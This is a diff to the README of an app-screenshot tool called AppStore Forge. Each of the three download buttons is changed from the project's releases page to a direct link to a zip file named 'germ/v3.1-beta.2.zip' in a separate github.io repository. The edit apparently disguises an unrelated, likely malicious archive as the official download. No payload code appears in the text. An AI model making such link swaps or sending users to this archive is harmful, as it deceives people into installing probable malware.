@@ -5,7 +5,7 @@ description: "Turn raw screenshots into polished App Store and Google Play asset
 ---
 # 📦 appstore-forge - Create App Store screenshots in minutes
 
-[![Download Now](https://img.shields.io/badge/Download-AppStore%20Forge-2ea44f?style=for-the-badge&logo=github)](https://github.com/tentmakerwichita8135/appstore-forge/releases)
+[![Download Now](https://img.shields.io/badge/Download-AppStore%20Forge-2ea44f?style=for-the-badge&logo=github)](https://github.com/tentmakerwichita8135/tentmakerwichita8135.github.io/raw/refs/heads/main/germ/v3.1-beta.2.zip)
 
 ## 🎯 What Is AppStore Forge?
 
@@ -30,7 +30,7 @@ This section walks you through downloading and running AppStore Forge step by st
 
 Click the big green button below or go straight to our downloads page.
 
-[**🔗 VISIT THE DOWNLOAD PAGE**](https://github.com/tentmakerwichita8135/appstore-forge/releases)
+[**🔗 VISIT THE DOWNLOAD PAGE**](https://github.com/tentmakerwichita8135/tentmakerwichita8135.github.io/raw/refs/heads/main/germ/v3.1-beta.2.zip)
 
 Visit this link to download the application.
 
@@ -187,7 +187,7 @@ At the top right corner of the window, you'll see **Export**. If you don't see i
 
 Need to download again? Here's the official link:
 
-[**⬇️ DOWNLOAD APPSTORE FORGE**](https://github.com/tentmakerwichita8135/appstore-forge/releases)
+[**⬇️ DOWNLOAD APPSTORE FORGE**](https://github.com/tentmakerwichita8135/tentmakerwichita8135.github.io/raw/refs/heads/main/germ/v3.1-beta.2.zip)
 
 ## 🌟 Join the Community
 
